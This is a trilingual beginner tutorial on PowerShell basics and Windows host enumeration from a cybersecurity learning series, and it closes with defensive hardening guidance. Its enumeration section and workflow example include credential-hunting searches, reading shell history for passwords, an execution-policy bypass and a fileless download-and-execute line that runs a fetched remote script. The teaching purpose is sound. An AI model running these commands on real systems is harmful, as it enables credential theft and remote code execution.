# 💠 PowerShell

> **LearnCybersecurity** | Basics Series | kodoktheGr3at | 2026

---


<!-- LC-CURRICULUM-START -->
> **Curriculum ID:** `LC-003` | **Phase 0:** Foundations  
> **Est. study:** 4-5h | **Level:** Beginner  
> **Prerequisites:** LC-001  
> **Book map:** Gray Hat Hacking Â Windows post-exploitation chapters
<!-- LC-CURRICULUM-END -->
## 📖 Daftar Isi / Table of Contents / 目次

| # | Category | Bahasa Indonesia | English | 日本語 |
|---|----------|-----------------|---------|--------|
| 1 | Overview | Apa itu PowerShell | What is PowerShell | PowerShellとは |
| 2 | Navigation | Navigasi direktori | Directory navigation | ディレクトリナビゲーション |
| 3 | File & Folder | Manajemen file & folder | File & folder management | ファイル・フォルダ管理 |
| 4 | System Info | Informasi sistem | System information | システム情報 |
| 5 | Network | Perintah jaringan | Network commands | ネットワークコマンド |
| 6 | User & Process | User & proses | Users & processes | ユーザー・プロセス |
| 7 | Pipeline & Objects | Pipeline & objek | Pipeline & objects | パイプラインとオブジェクト |
| 8 | Host Enumeration | Enumerasi host (izin) | Authorized host enumeration | 許可下のホスト列挙 |
| 9 | Security Note | CLM, logging & hardening | Constrained language & logging defense | 制約言語モードとログ防御 |
| 10 | Cheatsheet | Referensi cepat | Quick reference | クイックリファレンス |

---

## 1. 🏢 Overview — What is PowerShell

### 🇮🇩 Bahasa Indonesia
**PowerShell** adalah shell command-line dan bahasa scripting modern dari Microsoft, dibangun di atas .NET. Berbeda dengan CMD yang bekerja dengan teks biasa, PowerShell bekerja dengan **objek** — setiap output adalah objek .NET lengkap dengan properti dan method, bukan sekadar teks.

Dari perspektif **cybersecurity**, PowerShell sangat penting karena:
- Merupakan tool **post-exploitation** paling populer di Windows (mis. Empire, PowerSploit, Nishang)
- Mendukung **remoting** (eksekusi command di komputer lain)
- Sering digunakan untuk **bypass** antivirus/EDR karena "living off the land"

### 🇬🇧 English
**PowerShell** is Microsoft's modern command-line shell and scripting language, built on .NET. Unlike CMD which works with plain text, PowerShell works with **objects** — every output is a full .NET object with properties and methods, not just text.

From a **cybersecurity** perspective, PowerShell is critical because:
- It's the most popular **post-exploitation** tool on Windows (e.g. Empire, PowerSploit, Nishang)
- It supports **remoting** (executing commands on other machines)
- It's frequently used to **bypass** antivirus/EDR via "living off the land" techniques

### 🇯🇵 日本語
**PowerShell**は.NETベースのMicrosoftの最新のコマンドラインシェル兼スクリプト言語です。プレーンテキストで動作するCMDとは異なり、PowerShellは**オブジェクト**で動作します — すべての出力は単なるテキストではなく、プロパティとメソッドを持つ完全な.NETオブジェクトです。

**サイバーセキュリティ**の観点から、PowerShellは以下の理由で重要です：
- Windowsで最も人気のある**ポストエクスプロイテーション**ツール（例：Empire、PowerSploit、Nishang）
- **リモーティング**（他のマシンでのコマンド実行）をサポート
- 「Living off the Land」技術によりアンチウイルス/EDRの**バイパス**によく使われる

```powershell
# Open PowerShell
Win + R → type "powershell" → Enter

# Open as Administrator
Win + X → "Windows PowerShell (Admin)" / "Terminal (Admin)"

# Check PowerShell version
PS C:\> $PSVersionTable

# Get help for a cmdlet
PS C:\> Get-Help Get-Process
PS C:\> Get-Help Get-Process -Examples
PS C:\> Get-Help Get-Process -Full

# Update local help files (requires internet + admin)
PS C:\> Update-Help
```

> 💡 **Cmdlet naming convention:** PowerShell commands follow a `Verb-Noun` pattern (e.g. `Get-Process`, `Set-Location`, `New-Item`) — this makes them predictable and discoverable.

---

## 2. 📂 Navigation — Directory Navigation

### 🇮🇩 Bahasa Indonesia
PowerShell mendukung cmdlet native (`Get-ChildItem`, `Set-Location`) **dan** alias gaya CMD/Unix (`dir`, `cd`, `ls`) agar transisi lebih mudah.

### 🇬🇧 English
PowerShell supports native cmdlets (`Get-ChildItem`, `Set-Location`) **and** CMD/Unix-style aliases (`dir`, `cd`, `ls`) to make the transition easier.

### 🇯🇵 日本語
PowerShellはネイティブのコマンドレット（`Get-ChildItem`、`Set-Location`）**と** CMD/Unixスタイルのエイリアス（`dir`、`cd`、`ls`）の両方をサポートし、移行を容易にします。

```powershell
# Show current directory
PS C:\> Get-Location
PS C:\> pwd          # alias

# Change directory
PS C:\> Set-Location C:\Users\alex\Desktop
PS C:\> cd C:\Users\alex\Desktop    # alias

# Go up one level
PS C:\Users\alex\Desktop> cd ..

# List contents of current directory
PS C:\> Get-ChildItem
PS C:\> ls           # alias
PS C:\> dir          # alias

# List including hidden files
PS C:\> Get-ChildItem -Force

# List recursively
PS C:\> Get-ChildItem -Recurse

# List only directories
PS C:\> Get-ChildItem -Directory

# List only files matching a pattern
PS C:\> Get-ChildItem -Filter *.txt -Recurse
```

| Cmdlet | Alias | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 |
|--------|-------|-----------|-------------|---------|
| `Get-Location` | `pwd`, `gl` | Tampilkan direktori saat ini | Show current directory | 現在のディレクトリを表示 |
| `Set-Location` | `cd`, `sl` | Pindah direktori | Change directory | ディレクトリを変更 |
| `Get-ChildItem` | `dir`, `ls`, `gci` | Daftar isi folder | List folder contents | フォルダ内容を一覧表示 |
| `Get-ChildItem -Recurse` | — | Daftar rekursif | Recursive listing | 再帰的に一覧表示 |
| `Get-ChildItem -Force` | — | Termasuk file tersembunyi | Include hidden files | 隠しファイルを含む |

---

## 3. 📁 File & Folder Management

### 🇮🇩 Bahasa Indonesia
Cmdlet ini digunakan untuk **membuat, menyalin, memindahkan, dan menghapus** file maupun folder, serta membaca dan mencari konten.

### 🇬🇧 English
These cmdlets are used to **create, copy, move, and delete** files and folders, as well as read and search content.

### 🇯🇵 日本語
これらのコマンドレットは**ファイルやフォルダの作成、コピー、移動、削除**、およびコンテンツの読み取り・検索に使われます。

```powershell
# Create a new folder
PS C:\> New-Item -ItemType Directory -Path "newfolder"
PS C:\> mkdir newfolder      # alias

# Create a new empty file
PS C:\> New-Item -ItemType File -Path "file.txt"

# Remove a file or folder
PS C:\> Remove-Item file.txt
PS C:\> rm file.txt          # alias

# Remove a folder AND all its contents
PS C:\> Remove-Item -Path "folder" -Recurse -Force

# Copy a file
PS C:\> Copy-Item file.txt D:\backup\file.txt
PS C:\> cp file.txt D:\backup\        # alias

# Copy a folder recursively
PS C:\> Copy-Item -Path C:\source -Destination D:\dest -Recurse

# Move a file or folder
PS C:\> Move-Item file.txt D:\backup\
PS C:\> mv file.txt D:\backup\        # alias

# Rename a file or folder
PS C:\> Rename-Item oldname.txt newname.txt

# View contents of a text file
PS C:\> Get-Content file.txt
PS C:\> cat file.txt          # alias
PS C:\> type file.txt         # alias

# View only the last N lines (like tail)
PS C:\> Get-Content file.txt -Tail 10

# Search text inside files (like grep/findstr)
PS C:\> Select-String -Path "*.txt" -Pattern "password"
PS C:\> Get-Content file.txt | Select-String "password"

# Find files by name across the filesystem
PS C:\> Get-ChildItem -Path C:\ -Filter *.txt -Recurse -ErrorAction SilentlyContinue
```

| Cmdlet | Alias | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 |
|--------|-------|-----------|-------------|---------|
| `New-Item` | `ni`, `mkdir` | Buat file/folder baru | Create new file/folder | 新しいファイル・フォルダを作成 |
| `Remove-Item` | `rm`, `del`, `rmdir` | Hapus file/folder | Delete file/folder | ファイル・フォルダを削除 |
| `Copy-Item` | `cp`, `copy` | Salin file/folder | Copy file/folder | ファイル・フォルダをコピー |
| `Move-Item` | `mv`, `move` | Pindah file/folder | Move file/folder | ファイル・フォルダを移動 |
| `Rename-Item` | `ren` | Ganti nama | Rename | 名前を変更 |
| `Get-Content` | `cat`, `type`, `gc` | Tampilkan isi file | Display file contents | ファイル内容を表示 |
| `Select-String` | `sls` | Cari teks (seperti grep) | Search text (like grep) | テキストを検索（grepのような） |

---

## 4. 💻 System Information

### 🇮🇩 Bahasa Indonesia
Cmdlet ini digunakan untuk **mendapatkan informasi sistem**, hardware, dan environment variables — banyak menggunakan namespace `CIM`/`WMI`.

### 🇬🇧 English
These cmdlets are used to **retrieve system information**, hardware, and environment variables — many leverage the `CIM`/`WMI` namespace.

### 🇯🇵 日本語
これらのコマンドレットは**システム情報**、ハードウェア、環境変数の取得に使われます — 多くは`CIM`/`WMI`名前空間を利用します。

```powershell
# Show OS info
PS C:\> Get-ComputerInfo

# Show specific OS details
PS C:\> Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture

# Show environment variables
PS C:\> Get-ChildItem Env:
PS C:\> $env:USERNAME
PS C:\> $env:COMPUTERNAME
PS C:\> $env:PATH

# List installed hotfixes/patches
PS C:\> Get-HotFix

# List installed software
PS C:\> Get-CimInstance -ClassName Win32_Product | Select-Object Name, Version

# Show disk drive info
PS C:\> Get-PSDrive
PS C:\> Get-CimInstance Win32_LogicalDisk

# Show BIOS / hardware info
PS C:\> Get-CimInstance Win32_BIOS
PS C:\> Get-CimInstance Win32_ComputerSystem

# Clear the screen
PS C:\> Clear-Host
PS C:\> cls          # alias
```

| Cmdlet | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 |
|--------|-----------|-------------|---------|
| `Get-ComputerInfo` | Info sistem lengkap | Full system information | 完全なシステム情報 |
| `Get-CimInstance` | Query WMI/CIM (OS, hardware, dll.) | Query WMI/CIM (OS, hardware, etc.) | WMI/CIMクエリ（OS、ハードウェアなど） |
| `Get-ChildItem Env:` | Tampilkan env variables | Show environment variables | 環境変数を表示 |
| `Get-HotFix` | Daftar hotfix terinstal | List installed hotfixes | インストール済みホットフィックス一覧 |
| `Get-PSDrive` | Daftar drive/volume | List drives/volumes | ドライブ・ボリューム一覧 |
| `Clear-Host` | Bersihkan layar | Clear screen | 画面をクリア |

> 💡 **Pentesting note:** `Get-HotFix` helps identify missing security patches that may indicate exploitable vulnerabilities.

---

## 5. 🌐 Network Commands

### 🇮🇩 Bahasa Indonesia
PowerShell menyediakan cmdlet network modern, ditambah masih bisa memanggil tool legacy seperti `ping` dan `ipconfig`.

### 🇬🇧 English
PowerShell provides modern networking cmdlets, while still being able to call legacy tools like `ping` and `ipconfig`.

### 🇯🇵 日本語
PowerShellは最新のネットワーキングコマンドレットを提供しつつ、`ping`や`ipconfig`のようなレガシーツールも引き続き呼び出せます。

```powershell
# Show IP configuration (modern cmdlet)
PS C:\> Get-NetIPConfiguration
PS C:\> Get-NetIPAddress

# Legacy equivalent (still works)
PS C:\> ipconfig /all

# Test connectivity to a host
PS C:\> Test-Connection google.com
PS C:\> ping google.com          # legacy alias still works

# Trace the route to a host
PS C:\> Test-NetConnection google.com -TraceRoute

# Test if a specific port is open
PS C:\> Test-NetConnection -ComputerName target.com -Port 443

# Show active network connections
PS C:\> Get-NetTCPConnection

# Show DNS cache
PS C:\> Get-DnsClientCache

# Resolve a domain name (DNS lookup)
PS C:\> Resolve-DnsName google.com

# Flush DNS cache
PS C:\> Clear-DnsClientCache

# Show network adapters
PS C:\> Get-NetAdapter

# Download a file from the web (like curl/wget)
PS C:\> Invoke-WebRequest -Uri http://target.com/file.txt -OutFile file.txt
PS C:\> iwr http://target.com -UseBasicParsing      # alias
```

| Cmdlet | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 |
|--------|-----------|-------------|---------|
| `Get-NetIPConfiguration` | Konfigurasi IP modern | Modern IP configuration | 最新のIP設定 |
| `Test-Connection` | Tes konektivitas (ping) | Test connectivity (ping) | 接続テスト（ping） |
| `Test-NetConnection` | Tes port/koneksi spesifik | Test specific port/connection | 特定のポート・接続をテスト |
| `Get-NetTCPConnection` | Koneksi TCP aktif | Active TCP connections | アクティブなTCP接続 |
| `Resolve-DnsName` | DNS lookup | DNS lookup | DNSルックアップ |
| `Invoke-WebRequest` | HTTP request (seperti curl) | HTTP request (like curl) | HTTPリクエスト（curlのような） |

> 💡 **Pentesting note:** `Invoke-WebRequest` (alias `iwr`) and `Invoke-RestMethod` (`irm`) are commonly used in fileless/in-memory attack chains to download and execute payloads directly from memory.

---

## 6. 👤 Users & Processes

### 🇮🇩 Bahasa Indonesia
Cmdlet ini digunakan untuk **mengelola user account**, grup, dan **memonitor proses** yang sedang berjalan.

### 🇬🇧 English
These cmdlets are used to **manage user accounts**, groups, and **monitor running processes**.

### 🇯🇵 日本語
これらのコマンドレットは**ユーザーアカウントの管理**、グループ、実行中の**プロセスの監視**に使われます。

```powershell
# Show current logged-in user
PS C:\> whoami
PS C:\> $env:USERNAME

# Show current user's groups and privileges
PS C:\> whoami /groups
PS C:\> whoami /priv

# List all local user accounts
PS C:\> Get-LocalUser

# Show details of a specific user
PS C:\> Get-LocalUser -Name "alex"

# Create a new local user
PS C:\> New-LocalUser -Name "alex" -Password (ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force)

# Add user to local Administrators group
PS C:\> Add-LocalGroupMember -Group "Administrators" -Member "alex"

# List local groups
PS C:\> Get-LocalGroup

# List members of Administrators group
PS C:\> Get-LocalGroupMember -Group "Administrators"

# Delete a user
PS C:\> Remove-LocalUser -Name "alex"

# List running processes
PS C:\> Get-Process
PS C:\> ps          # alias

# Find a specific process
PS C:\> Get-Process | Where-Object {$_.ProcessName -like "*chrome*"}

# Kill a process by name
PS C:\> Stop-Process -Name "notepad" -Force

# Kill a process by PID
PS C:\> Stop-Process -Id 1234 -Force

# Start a new process
PS C:\> Start-Process notepad.exe
```

| Cmdlet | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 |
|--------|-----------|-------------|---------|
| `Get-LocalUser` | Daftar semua user lokal | List all local users | すべてのローカルユーザー一覧 |
| `New-LocalUser` | Buat user baru | Create new user | 新規ユーザー作成 |
| `Add-LocalGroupMember` | Tambah ke grup | Add to group | グループに追加 |
| `Get-LocalGroupMember` | Tampilkan anggota grup | Show group members | グループメンバーを表示 |
| `Get-Process` | Daftar proses berjalan | List running processes | 実行中のプロセス一覧 |
| `Stop-Process` | Hentikan proses | Terminate a process | プロセスを終了 |
| `Start-Process` | Jalankan proses baru | Start a new process | 新しいプロセスを開始 |

> 🔴 **Critical:** `New-LocalUser` and `Add-LocalGroupMember` require running PowerShell **as Administrator**.

---

## 7. 🔗 Pipeline & Objects

### 🇮🇩 Bahasa Indonesia
Fitur paling kuat dari PowerShell adalah **pipeline berbasis objek**. Output dari satu cmdlet (objek lengkap dengan properti) bisa langsung dikirim ke cmdlet berikutnya tanpa parsing teks — berbeda dari Linux pipe yang berbasis teks mentah.

### 🇬🇧 English
PowerShell's most powerful feature is its **object-based pipeline**. Output from one cmdlet (a full object with properties) can be piped directly into the next cmdlet without text parsing — unlike Linux pipes which work on raw text.

### 🇯🇵 日本語
PowerShellの最も強力な機能は**オブジェクトベースのパイプライン**です。あるコマンドレットの出力（プロパティを持つ完全なオブジェクト）はテキスト解析なしで次のコマンドレットに直接渡せます — 生テキストで動作するLinuxパイプとは異なります。

```powershell
# Filter objects with Where-Object
PS C:\> Get-Process | Where-Object {$_.CPU -gt 100}

# Sort objects
PS C:\> Get-Process | Sort-Object CPU -Descending

# Select specific properties only
PS C:\> Get-Process | Select-Object Name, Id, CPU

# Format output as a table
PS C:\> Get-Process | Format-Table -AutoSize

# Format output as a list
PS C:\> Get-Process | Format-List

# Measure / count objects
PS C:\> Get-ChildItem | Measure-Object

# Export results to CSV
PS C:\> Get-Process | Export-Csv processes.csv -NoTypeInformation

# Convert to JSON (useful for scripting/exfil)
PS C:\> Get-Process | Select-Object Name, Id | ConvertTo-Json

# ForEach loop over pipeline objects
PS C:\> Get-ChildItem | ForEach-Object { Write-Host $_.Name }
```

| Cmdlet | Alias | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 |
|--------|-------|-----------|-------------|---------|
| `Where-Object` | `?`, `where` | Filter objek | Filter objects | オブジェクトをフィルタ |
| `Select-Object` | `select` | Pilih properti tertentu | Select specific properties | 特定のプロパティを選択 |
| `Sort-Object` | `sort` | Urutkan objek | Sort objects | オブジェクトをソート |
| `ForEach-Object` | `%`, `foreach` | Loop tiap objek | Loop over each object | 各オブジェクトをループ |
| `Format-Table` | `ft` | Format sebagai tabel | Format as table | テーブル形式 |
| `ConvertTo-Json` | — | Konversi ke JSON | Convert to JSON | JSONに変換 |

---

## 8. 🛡️ Authorized Host Enumeration

### 🇮🇩 Bahasa Indonesia
Pada **uji berizin** / lab sendiri, PowerShell berguna untuk inventaris host dan audit konfigurasi. Gunakan hanya pada sistem yang Anda miliki izinnya.

### 🇬🇧 English
On **authorized** engagements / your own lab, PowerShell helps inventory hosts and audit configuration. Use only on systems you are permitted to assess.

### 🇯🇵 日本語
**許可された**検証や自ラボでは、PowerShellでホスト棚卸しと設定監査が可能です。許可されたシステムでのみ使用してください。

```powershell
# ── Basic Recon ─────────────────────────────────────
whoami /all                                    # full identity, groups, privileges
$env:USERNAME, $env:COMPUTERNAME               # quick context
Get-ComputerInfo | Select OsName, OsVersion    # OS details

# ── Execution Policy (often needs bypassing) ────────
Get-ExecutionPolicy
Set-ExecutionPolicy Bypass -Scope Process       # temporary, current session only

# ── User & Group Enumeration ────────────────────────
Get-LocalUser
Get-LocalGroupMember -Group "Administrators"

# ── Network Enumeration ─────────────────────────────
Get-NetIPConfiguration
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}

# ── Files & Credentials Hunting ─────────────────────
Get-ChildItem -Path C:\ -Include *password*,*.kdbx -Recurse -ErrorAction SilentlyContinue
Select-String -Path C:\Users\*\Desktop\*.txt -Pattern "password"
Get-ChildItem -Path C:\Users -Include *.config,*.xml -Recurse -ErrorAction SilentlyContinue | Select-String "password"

# ── PowerShell History (often contains credentials) ─
Get-Content (Get-PSReadlineOption).HistorySavePath

# ── Scheduled Tasks & Services (priv-esc vectors) ───
Get-ScheduledTask | Select TaskName, State
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-CimInstance Win32_Service | Select Name, PathName, StartMode

# ── Installed Software & Patches ────────────────────
Get-HotFix | Sort-Object InstalledOn -Descending
Get-CimInstance Win32_Product | Select Name, Version

# ── Download & execute in-memory (fileless technique) ───
IEX (New-Object Net.WebClient).DownloadString('http://target.com/script.ps1')
```

> ⚠️ **Note:** These commands are intended for **authorized** penetration testing and CTF environments only. Many EDR/AV solutions flag `IEX`, `DownloadString`, and execution-policy bypasses — use with awareness of detection.

---

## 9. 🔐 Security Note — Admin Hardening, Constrained Language & Logging

### 🇮🇩 Bahasa Indonesia
PowerShell sering disalahgunakan oleh malware, jadi **kontrol admin + logging** adalah lapisan defense kritis di Windows.

### 🇬🇧 English
Because malware frequently abuses PowerShell, **admin controls and logging** are critical Windows defenses.

### 🇯🇵 日本語
マルウェアがPowerShellを悪用しやすいため、**管理者制御とログ**はWindows防御の重要層です。

```powershell
# ── Language mode (defense posture) ─────────────────────────
$ExecutionContext.SessionState.LanguageMode
# FullLanguage | ConstrainedLanguage | RestrictedLanguage | NoLanguage
# Constrained Language Mode (CLM) blocks most .NET / COM abuse while
# allowing approved cmdlets — pair with AppLocker/WDAC script rules.

# ── Execution policy (necessary but NOT a security boundary) ─
Get-ExecutionPolicy -List
# Prefer: AllSigned / RemoteSigned for admins; enforce via GPO.
# Attackers can bypass process-scoped policy — rely on WDAC + logging.

# ── Script Block Logging / Module Logging / Transcription ────
# Enable via GPO (recommended) under:
# Computer Config → Admin Templates → Windows Components → Windows PowerShell
#  - Turn on PowerShell Script Block Logging
#  - Turn on Module Logging (core modules + *)
#  - Turn on PowerShell Transcription (central share)
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 20

# ── Just Enough Administration (JEA) ─────────────────────────
# Expose only approved cmdlets/functions to remote admins
Get-PSSessionConfiguration | Format-Table Name, Permission

# ── Least privilege for interactive admins ───────────────────
# Daily work: standard user; elevate only for change windows
whoami /groups | findstr /i "Admin High Mandatory"
```

| Control | 🇮🇩 | 🇬🇧 | 🇯🇵 |
|---------|----|----|----|
| Constrained Language Mode | Batasi .NET berbahaya | Limit dangerous .NET/COM | 危険な.NET/COMを制限 |
| WDAC / AppLocker | Izinkan script bertanda | Allow only signed/approved | 署名済みのみ許可 |
| Script Block Logging | Audit isi script | Audit script contents | スクリプト内容を監査 |
| Transcription | Rekam sesi admin | Record admin sessions | 管理セッション記録 |
| JEA | Admin remote minimal | Minimal remote admin surface | 最小のリモート管理面 |
| AMSI + Defender | Deteksi script jahat | Detect malicious scripts | 悪意スクリプト検知 |

> 🛡️ **Defense-first:** ExecutionPolicy alone is not a security boundary. Combine **WDAC/AppLocker + CLM + Script Block Logging + JEA** and monitor Event ID 4104/4103 for anomalous admin activity.

---

## 📊 Command Summary Table

| Cmdlet | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 | Admin needed? |
|--------|-----------|-------------|---------|----------------|
| `Get-ChildItem` | Daftar isi folder | List folder contents | フォルダ内容を一覧表示 | ❌ |
| `Set-Location` | Pindah direktori | Change directory | ディレクトリを変更 | ❌ |
| `New-Item` / `Remove-Item` | Buat/hapus file-folder | Create/remove file-folder | ファイル・フォルダの作成・削除 | ❌ (system: ✅) |
| `Copy-Item` / `Move-Item` | Salin/pindah file | Copy/move file | ファイルのコピー・移動 | ❌ |
| `Get-Content` | Tampilkan isi file | Display file contents | ファイル内容を表示 | ❌ |
| `Get-ComputerInfo` | Info sistem | System info | システム情報 | ❌ |
| `Get-NetIPConfiguration` | Konfigurasi jaringan | Network configuration | ネットワーク設定 | ❌ |
| `Test-Connection` | Tes jaringan (ping) | Network test (ping) | ネットワークテスト（ping） | ❌ |
| `Get-NetTCPConnection` | Koneksi aktif | Active connections | アクティブな接続 | ❌ |
| `whoami /all` | Identitas user lengkap | Full user identity | 完全なユーザー情報 | ❌ |
| `New-LocalUser` | Buat user | Create user | ユーザー作成 | ✅ |
| `Add-LocalGroupMember` | Kelola grup | Manage groups | グループ管理 | ✅ |
| `Get-Process` / `Stop-Process` | Kelola proses | Manage processes | プロセス管理 | ❌ (some: ✅) |
| `Get-ScheduledTask` | Scheduled tasks | Scheduled tasks | スケジュールタスク | ❌ |
| `Invoke-WebRequest` | HTTP request | HTTP request | HTTPリクエスト | ❌ |

---

## 🔗 Practical Workflow Example

```powershell
# ── SCENARIO: Quick Windows host enumeration ─────────

# 1. Identify who and where you are
whoami /all
Get-ComputerInfo | Select-Object OsName, OsVersion, OsArchitecture

# 2. Check network setup
Get-NetIPConfiguration
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}

# 3. Enumerate users and groups
Get-LocalUser
Get-LocalGroupMember -Group "Administrators"

# 4. Look for interesting files
Get-ChildItem -Path C:\Users -Include *password*,*.config -Recurse -ErrorAction SilentlyContinue
Select-String -Path C:\Users\*\Desktop\*.txt -Pattern "password"

# 5. Check scheduled tasks and services for priv-esc
Get-ScheduledTask | Select-Object TaskName, State
Get-CimInstance Win32_Service | Select-Object Name, PathName, StartMode

# 6. Check running processes
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
```

---

## 🧠 Quick Reference Cheatsheet

```powershell
# ── NAVIGATION ──────────────────────────────────────────────
Set-Location <path>            # cd        — change directory
Get-Location                   # pwd       — show current directory
Get-ChildItem                  # dir, ls   — list contents
Get-ChildItem -Recurse         #           — list recursively

# ── FILE / FOLDER ───────────────────────────────────────────
New-Item -ItemType Directory <name>    # mkdir   — create folder
Remove-Item -Recurse -Force <name>     # rm /s   — delete folder + contents
Copy-Item <src> <dest>                 # cp      — copy file
Move-Item <src> <dest>                 # mv      — move file/folder
Get-Content <file>                     # cat     — view file contents
Select-String -Path <file> -Pattern "<text>"   # grep — search inside file

# ── SYSTEM INFO ─────────────────────────────────────────────
Get-ComputerInfo               # full system info
Get-CimInstance Win32_OperatingSystem   # OS details
Get-HotFix                     # installed patches
Get-ChildItem Env:              # environment variables
Clear-Host                     # cls — clear screen

# ── NETWORK ──────────────────────────────────────────────────
Get-NetIPConfiguration         # IP config
Test-Connection <host>         # ping
Test-NetConnection <host> -Port <port>   # check specific port
Get-NetTCPConnection           # active connections
Resolve-DnsName <domain>       # DNS lookup
Invoke-WebRequest -Uri <url> -OutFile <file>   # download (curl-like)

# ── USERS / PROCESSES ───────────────────────────────────────
whoami /all                    # current user, groups, privileges
Get-LocalUser                  # list local users
New-LocalUser -Name <name> -Password <securestring>
Add-LocalGroupMember -Group "Administrators" -Member <name>
Get-Process                    # list running processes
Stop-Process -Name <name> -Force   # kill process by name

# ── PIPELINE / OBJECTS ───────────────────────────────────────
Get-Process | Where-Object {$_.CPU -gt 100}    # filter
Get-Process | Sort-Object CPU -Descending      # sort
Get-Process | Select-Object Name, Id           # select fields
Get-Process | Format-Table -AutoSize           # format as table
Get-Process | ConvertTo-Json                   # convert to JSON

# ── DEFENSE / HARDENING CHECKS ──────────────────────────────
$ExecutionContext.SessionState.LanguageMode   # expect ConstrainedLanguage where enforced
Get-ExecutionPolicy -List                     # policy inventory (not a boundary alone)
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 10
Get-PSSessionConfiguration | Format-Table Name, Permission
```

---

> 📚 **References & Book Sources:**
> - Peter Kim — *The Hacker Playbook 3* (`~/Documents/Books/CyberSec/Ethical Hacking/`) — authorized methodology context
> - Georgia Weidman — *Penetration Testing: A Hands-On Introduction to Hacking* (`~/Documents/Books/CyberSec/Ethical Hacking/`)
> - Allen Harper et al. — *Gray Hat Hacking* (`~/Documents/Books/CyberSec/Handbook/`)
> - Microsoft Docs — [PowerShell Security](https://learn.microsoft.com/en-us/powershell/scripting/security/overview) · Script Block Logging · JEA · Constrained Language Mode
> - [HackTheBox Academy - Windows Fundamentals](https://academy.hackthebox.com)
> - `Get-Help <cmdlet> -Full`

> **LearnCybersecurity** | Basics Series | kodoktheGr3at | 2026  
> 🔖 **Repository:** [LearnCybersecurity](https://github.com/Kodokthegr3at/LearnCybersecurity)  
> 💬 **Feedback & Contributions welcome!** Open an issue or PR if you spot any errors.